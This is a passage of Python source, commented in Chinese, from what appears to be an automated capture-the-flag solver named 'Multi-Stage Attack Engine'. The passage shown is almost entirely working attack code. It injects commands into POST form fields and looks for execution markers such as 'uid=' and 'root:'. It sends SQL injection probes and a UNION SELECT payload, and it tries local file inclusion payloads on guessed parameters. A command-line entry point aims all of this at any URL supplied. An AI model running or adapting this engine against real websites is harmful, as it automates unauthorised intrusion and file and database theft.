                if re.search(r'(?:uid=|root:|bin/)', body2):
                    _emit("rce_hit", param, f"命令执行成功!")
                    return None

        # POST 探测
        if analysis["forms"]:
            for form_data in analysis["forms"]:
                for param in form_data.get("inputs", []):
                    for cmd in cmds[:3]:
                        data = urllib.parse.urlencode({param: cmd}).encode()
                        resp2 = self.http.request(url, method="POST", data=data)
                        flag = FLAG_RE.search(resp2.get("body", ""))
                        if flag:
                            _found(flag.group(0))
                            return None

        return None

    def _stage_generic(self, url: str, resp: dict, analysis: dict,
                       _emit, _found) -> Optional[str]:
        """通用攻击: SQLi盲注 + 文件探测 + 跳转跟随."""
        _emit("attack", "通用攻击", "SQLi+XSS+文件探测...")

        # 1. SQLi 快速探测
        sqli_probes = ["'", '"', "1' OR '1'='1", "1' AND 1=1--"]
        for param in analysis.get("inputs", ["id", "page", "q", "search"]):
            if self._cancelled:
                break
            for probe in sqli_probes[:2]:  # 仅快速探测
                test_url = f"{url}?{param}={urllib.parse.quote(probe)}"
                resp2 = self.http.request(test_url)
                body2 = resp2.get("body", "")
                # 检查 SQL 错误
                if re.search(r'(?:sql|syntax|mysql|sqlite|warning)', body2, re.I):
                    _emit("sqli_hint", param, f"SQL 错误泄露")
                    # 尝试 UNION
                    union = f"' UNION SELECT 1,flag,3 FROM flag-- "
                    resp3 = self.http.request(f"{url}?{param}={urllib.parse.quote(union)}")
                    body3 = resp3.get("body", "")
                    flag = FLAG_RE.search(body3)
                    if flag:
                        _found(flag.group(0))
                        return None

        # 2. 文件读取探测 (LFI)
        for param in analysis.get("inputs", ["file", "page", "include", "path"]):
            for lfi_path in LFI_PAYLOADS[:4]:
                test_url = f"{url}?{param}={urllib.parse.quote(lfi_path)}"
                resp2 = self.http.request(test_url)
                body2 = resp2.get("body", "")
                flag = FLAG_RE.search(body2)
                if flag:
                    _found(flag.group(0))
                    return None

        # 3. 跳转提取 (已经在 solve() 主循环中处理)
        return None


# ═══════════════════════════════════════════════════════════
#  CLI
# ═══════════════════════════════════════════════════════════

if __name__ == "__main__":
    import sys, json

    if len(sys.argv) < 2:
        print("Multi-Stage Attack Engine CLI")
        print("  python multi_stage.py <url>  — 自动多阶段解题")
        sys.exit(0)

    url = sys.argv[1]
    engine = MultiStageEngine()
    result = engine.solve(url, on_progress=lambda s, i, st: print(f"  [{s}] {i}: {st}"))
    print(f"\n{'='*50}")
    print(f"Success: {result['success']}")
    if result['flag']:
        print(f"FLAG: {result['flag']}")
    print(f"Stages: {result['stages_count']}")
    print(f"Time: {result['timing_ms']}ms")
    for log_entry in result['attack_log']:
        print(f"  Stage {log_entry['stage']}: {log_entry['type']} → {log_entry['result']}")
